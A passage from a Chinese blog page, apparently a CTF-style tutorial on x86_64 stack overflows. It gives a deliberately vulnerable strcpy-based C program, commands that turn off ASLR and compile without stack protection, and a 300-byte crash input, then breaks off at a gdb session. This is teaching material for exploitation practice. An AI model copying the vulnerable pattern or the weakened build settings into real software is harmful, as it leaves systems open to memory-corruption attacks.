<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>栈溢出x86_64 | 技术栈</title><meta name="description" content="[TOC]  1. x86和x86_64的区别 第一个主要区别就是内存地址的大小。这没啥可惊奇的: 不过即便内存地址有64位长用户空间也只能使用前47位，要牢记这点因为当你指定一个大于0x00007fffffffffff的地址时会抛出一个异常。那也就意味着0x4141414141414141会抛出异常而0x0000414141414141是安全的。当你在进行模糊测试或编写利用程序的时候我觉得这是个"><meta property="og:type" content="article"><meta property="og:title" content="栈溢出x86_64"><meta property="og:url" content="https://www.rgzzplus.com/2022/08/27/%E6%A0%88%E6%BA%A2%E5%87%BAx86-64/index.html"><meta property="og:site_name" content="技术栈"><meta property="og:description" content="[TOC]  1. x86和x86_64的区别 第一个主要区别就是内存地址的大小。这没啥可惊奇的: 不过即便内存地址有64位长用户空间也只能使用前47位，要牢记这点因为当你指定一个大于0x00007fffffffffff的地址时会抛出一个异常。那也就意味着0x4141414141414141会抛出异常而0x0000414141414141是安全的。当你在进行模糊测试或编写利用程序的时候我觉得这是个"><meta property="og:locale" content="zh_CN"><meta property="article:published_time" content="2022-08-27T04:45:51.000Z"><meta property="article:modified_time" content="2022-08-27T04:47:22.175Z"><meta property="article:author" content="rgzzplus"><meta property="article:tag" content="栈溢出"><meta name="twitter:card" content="summary"><link rel="canonical" href="https://www.rgzzplus.com/2022/08/27/%E6%A0%88%E6%BA%A2%E5%87%BAx86-64/index.html"><link rel="alternate" href="/atom.xml" title="技术栈" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet"><meta name="generator" content="Hexo 6.0.0"></head><body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/rgzz-zq" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">人工智障plus</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md"></h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Wuhan, China</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="搜索"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">首页</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">归档</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">分类</span></a></li><li class="menu-item menu-item-repository"><a href="/repository"><i class="icon icon-project"></i> <span class="menu-title">项目</span></a></li><li class="menu-item menu-item-links"><a href="/links"><i class="icon icon-friendship"></i> <span class="menu-title">友链</span></a></li><li class="menu-item menu-item-about"><a href="/about"><i class="icon icon-cup-fill"></i> <span class="menu-title">关于</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/rgzz-zq" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="icon icon-rss"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">公告</h3><div class="widget-body"><div id="board"><div class="content"><p>欢迎来到技术栈！</p></div></div></div></div><div class="widget"><h3 class="widget-title">分类</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/0day%E5%AE%89%E5%85%A8/">0day安全</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA/">个人</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7/">工具</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/">经验交流</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%BD%AC%E8%BD%BD/">转载</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%A2%98%E5%BA%93-%E4%BD%9C%E4%B8%9A/">题库/作业</a><span class="category-list-count">2</span></li></ul></div></div><div class="widget"><h3 class="widget-title">标签</h3><div class="widget-body"><ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ASLR/" rel="tag">ASLR</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C++</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C%E5%92%8C%E6%8C%87%E9%92%88/" rel="tag">C和指针</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DEP/" rel="tag">DEP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GS/" rel="tag">GS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Git/" rel="tag">Git</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HeapSpary/" rel="tag">HeapSpary</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LNMP/" rel="tag">LNMP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" rel="tag">Linux保护机制</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" rel="tag">Linux常用命令</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux%E6%B1%87%E7%BC%96%E4%BC%AA%E6%8C%87%E4%BB%A4/" rel="tag">Linux汇编伪指令</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SEHOP/" rel="tag">SEHOP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SafeSEH/" rel="tag">SafeSEH</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/" rel="tag">c</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gdb/" rel="tag">gdb</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%A4%A7%E5%85%A8/" rel="tag">linux命令行大全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E9%97%AE%E9%A2%98/" rel="tag">linux问题</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ollydebug/" rel="tag">ollydebug</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/task-struct/" rel="tag">task_struct</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/typora/" rel="tag">typora</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ubuntu/" rel="tag">ubuntu</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%AD%E5%9B%BD%E7%9F%A5%E7%BD%91/" rel="tag">中国知网</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BA%92%E6%96%A5%E9%94%81/" rel="tag">互斥锁</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E5%8F%B7%E9%87%8F/" rel="tag">信号量</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BC%8F%E6%B4%9E/" rel="tag">其它类型的漏洞</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E7%AB%AF/" rel="tag">内存大小端</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB/" rel="tag">内存攻击</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/" rel="tag">函数指针</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/" rel="tag">同步互斥</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A0%86/" rel="tag">堆</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B1%8F%E9%9A%9C/" rel="tag">屏障</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BB%BA%E7%AB%99/" rel="tag">建站</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BF%83%E8%B7%AF/" rel="tag">心路</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag">攻防世界</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/" rel="tag">整数安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82%E8%B0%88/" rel="tag">杂谈</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%A1%E4%BB%B6%E5%8F%98%E9%87%8F/" rel="tag">条件变量</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%88/" rel="tag">栈</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" rel="tag">格式化字符串</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" rel="tag">正则表达式</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/" rel="tag">汇编指令</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%87%AA%E6%97%8B%E9%94%81/" rel="tag">自旋锁</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AF%BB%E5%86%99%E9%94%81/" rel="tag">读写锁</a><span class="tag-list-count">1</span></li></ul></div></div><div class="widget"><h3 class="widget-title">标签云</h3><div class="widget-body tagcloud"><a href="/tags/ASLR/" style="font-size:13px">ASLR</a> <a href="/tags/C/" style="font-size:13px">C++</a> <a href="/tags/C%E5%92%8C%E6%8C%87%E9%92%88/" style="font-size:13.33px">C和指针</a> <a href="/tags/DEP/" style="font-size:13px">DEP</a> <a href="/tags/GS/" style="font-size:13px">GS</a> <a href="/tags/Git/" style="font-size:13px">Git</a> <a href="/tags/HeapSpary/" style="font-size:13px">HeapSpary</a> <a href="/tags/LNMP/" style="font-size:13px">LNMP</a> <a href="/tags/Linux/" style="font-size:13px">Linux</a> <a href="/tags/Linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" style="font-size:13px">Linux保护机制</a> <a href="/tags/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" style="font-size:13px">Linux常用命令</a> <a href="/tags/Linux%E6%B1%87%E7%BC%96%E4%BC%AA%E6%8C%87%E4%BB%A4/" style="font-size:13px">Linux汇编伪指令</a> <a href="/tags/SEHOP/" style="font-size:13px">SEHOP</a> <a href="/tags/SafeSEH/" style="font-size:13px">SafeSEH</a> <a href="/tags/c/" style="font-size:13px">c</a> <a href="/tags/gdb/" style="font-size:13.67px">gdb</a> <a href="/tags/hexo/" style="font-size:13.33px">hexo</a> <a href="/tags/linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%A4%A7%E5%85%A8/" style="font-size:13px">linux命令行大全</a> <a href="/tags/linux%E9%97%AE%E9%A2%98/" style="font-size:13px">linux问题</a> <a href="/tags/ollydebug/" style="font-size:13px">ollydebug</a> <a href="/tags/pwn/" style="font-size:13px">pwn</a> <a href="/tags/reverse/" style="font-size:13.33px">reverse</a> <a href="/tags/shellcode/" style="font-size:13.33px">shellcode</a> <a href="/tags/task-struct/" style="font-size:13px">task_struct</a> <a href="/tags/typora/" style="font-size:13px">typora</a> <a href="/tags/ubuntu/" style="font-size:13.67px">ubuntu</a> <a href="/tags/%E4%B8%AD%E5%9B%BD%E7%9F%A5%E7%BD%91/" style="font-size:13px">中国知网</a> <a href="/tags/%E4%BA%92%E6%96%A5%E9%94%81/" style="font-size:13px">互斥锁</a> <a href="/tags/%E4%BF%A1%E5%8F%B7%E9%87%8F/" style="font-size:13px">信号量</a> <a href="/tags/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BC%8F%E6%B4%9E/" style="font-size:13px">其它类型的漏洞</a> <a href="/tags/%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E7%AB%AF/" style="font-size:13px">内存大小端</a> <a href="/tags/%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB/" style="font-size:13px">内存攻击</a> <a href="/tags/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/" style="font-size:13px">函数指针</a> <a href="/tags/%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/" style="font-size:13px">同步互斥</a> <a href="/tags/%E5%A0%86/" style="font-size:13.67px">堆</a> <a href="/tags/%E5%B1%8F%E9%9A%9C/" style="font-size:13px">屏障</a> <a href="/tags/%E5%BB%BA%E7%AB%99/" style="font-size:13px">建站</a> <a href="/tags/%E5%BF%83%E8%B7%AF/" style="font-size:13px">心路</a> <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size:13.33px">攻防世界</a> <a href="/tags/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/" style="font-size:13px">整数安全</a> <a href="/tags/%E6%9D%82%E8%B0%88/" style="font-size:13px">杂谈</a> <a href="/tags/%E6%9D%A1%E4%BB%B6%E5%8F%98%E9%87%8F/" style="font-size:13px">条件变量</a> <a href="/tags/%E6%A0%88/" style="font-size:13px">栈</a> <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size:13px">栈溢出</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size:13px">格式化字符串</a> <a href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" style="font-size:13px">正则表达式</a> <a href="/tags/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/" style="font-size:13px">汇编指令</a> <a href="/tags/%E6%BC%8F%E6%B4%9E/" style="font-size:14px">漏洞</a> <a href="/tags/%E8%87%AA%E6%97%8B%E9%94%81/" style="font-size:13px">自旋锁</a> <a href="/tags/%E8%AF%BB%E5%86%99%E9%94%81/" style="font-size:13px">读写锁</a></div></div><div class="widget"><h3 class="widget-title">归档</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">八月 2022</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">七月 2022</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">五月 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">四月 2022</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a><span class="archive-list-count">16</span></li></ul></div></div><div class="widget"><h3 class="widget-title">最新文章</h3><div class="widget-body"><ul class="recent-post-list list-unstyled"><li><div class="item-thumb"><a href="/2022/08/27/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/CTF/">CTF</a></p><p class="item-title"><a href="/2022/08/27/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/" class="title">整数安全</a></p><p class="item-date"><time datetime="2022-08-27T04:48:59.000Z" itemprop="datePublished">2022-08-27</time></p></div></li><li><div class="item-thumb"><a href="/2022/08/27/%E6%A0%88%E6%BA%A2%E5%87%BAx86-64/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/CTF/">CTF</a></p><p class="item-title"><a href="/2022/08/27/%E6%A0%88%E6%BA%A2%E5%87%BAx86-64/" class="title">栈溢出x86_64</a></p><p class="item-date"><time datetime="2022-08-27T04:45:51.000Z" itemprop="datePublished">2022-08-27</time></p></div></li><li><div class="item-thumb"><a href="/2022/08/27/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2x86-64/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/CTF/">CTF</a></p><p class="item-title"><a href="/2022/08/27/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2x86-64/" class="title">格式化字符串x86_64</a></p><p class="item-date"><time datetime="2022-08-27T04:45:33.000Z" itemprop="datePublished">2022-08-27</time></p></div></li><li><div class="item-thumb"><a href="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/CTF/">CTF</a></p><p class="item-title"><a href="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/" class="title">Linux_shellcode开发之实战</a></p><p class="item-date"><time datetime="2022-08-08T14:39:50.000Z" itemprop="datePublished">2022-08-08</time></p></div></li><li><div class="item-thumb"><a href="/2022/08/08/gdb%E6%98%BE%E7%A4%BAintel%E5%92%8Catt%E6%B1%87%E7%BC%96/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E8%BD%AC%E8%BD%BD/">转载</a></p><p class="item-title"><a href="/2022/08/08/gdb%E6%98%BE%E7%A4%BAintel%E5%92%8Catt%E6%B1%87%E7%BC%96/" class="title">gdb显示intel和at&amp;t汇编</a></p><p class="item-date"><time datetime="2022-08-08T14:36:22.000Z" itemprop="datePublished">2022-08-08</time></p></div></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse in" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">文章目录</h3><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-x86%E5%92%8Cx86_64%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.</span> <span class="toc-text">1. x86和x86_64的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E7%89%87%E6%AE%B5"><span class="toc-number">2.</span> <span class="toc-text">2. 漏洞代码片段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">3. 触发漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%8E%A7%E5%88%B6rip"><span class="toc-number">4.</span> <span class="toc-text">4. 控制RIP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E8%B7%B3%E5%85%A5%E7%94%A8%E6%88%B7%E6%8E%A7%E5%88%B6%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA"><span class="toc-number">5.</span> <span class="toc-text">5. 跳入用户控制的缓冲区</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E6%89%A7%E8%A1%8Cshellcode"><span class="toc-number">6.</span> <span class="toc-text">6. 执行shellcode</span></a></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-栈溢出x86-64" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">栈溢出x86_64</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2022/08/27/%E6%A0%88%E6%BA%A2%E5%87%BAx86-64/" class="article-date"><time datetime="2022-08-27T04:45:51.000Z" itemprop="datePublished">2022-08-27</time> </a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/CTF/">CTF</a> </span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a> </span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span> </span></span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="/2022/08/27/%E6%A0%88%E6%BA%A2%E5%87%BAx86-64/" class="leancloud_visitors" data-flag-title="栈溢出x86_64"><span class="leancloud-visitors-count">0</span> </span></span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/08/27/%E6%A0%88%E6%BA%A2%E5%87%BAx86-64/#comments" class="article-comment-link">评论</a></span> <span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 2.7k(字)</span> <span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 14(分)</span></div></div><div class="article-entry marked-body" itemprop="articleBody"><p>[TOC]</p><h2 id="1-x86和x86_64的区别"><a class="markdownIt-Anchor" href="#1-x86和x86_64的区别"></a> 1. x86和x86_64的区别</h2><p>第一个主要区别就是内存地址的大小。这没啥可惊奇的: 不过即便内存地址有64位长用户空间也<strong>只能使用前47位</strong>，要牢记这点因为当你指定一个大于0x00007fffffffffff的地址时会抛出一个异常。那也就意味着0x4141414141414141会抛出异常而0x0000414141414141是安全的。当你在进行模糊测试或编写利用程序的时候我觉得这是个很巧妙的部分。</p><p>事实上还有很多其他的不同但是考虑到本文的目的不了解所有的差异也没关系。</p><h2 id="2-漏洞代码片段"><a class="markdownIt-Anchor" href="#2-漏洞代码片段"></a> 2. 漏洞代码片段</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bof.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123; </span><br><span class="line">      <span class="type">char</span> buffer[<span class="number">256</span>];</span><br><span class="line">      <span class="keyword">if</span>(argc != <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, buffer);</span><br><span class="line">      <span class="built_in">strcpy</span>(buffer,  argv[<span class="number">1</span>]);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>做实验首先要注意：<br>1.关闭ASLR，linux下ASLR是自动开启的，不关闭的话栈地址每次都是随机的（需要管理员权限）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span></span><br></pre></td></tr></table></figure><p>2.编译时关闭CANARY，PIE等栈相关保护。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/overflow$ gcc bof.c -o bof -z execstack -fno-stack-protector -g</span><br></pre></td></tr></table></figure><h2 id="3-触发漏洞"><a class="markdownIt-Anchor" href="#3-触发漏洞"></a> 3. 触发漏洞</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/overflow$ ./bof $(python -c &#x27;print &quot;A&quot; * 300&#x27;)</span><br><span class="line">0x7fffffffddb0</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">段错误 (核心已转储)</span><br></pre></td></tr></table></figure><p>我们用 gdb 调试一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 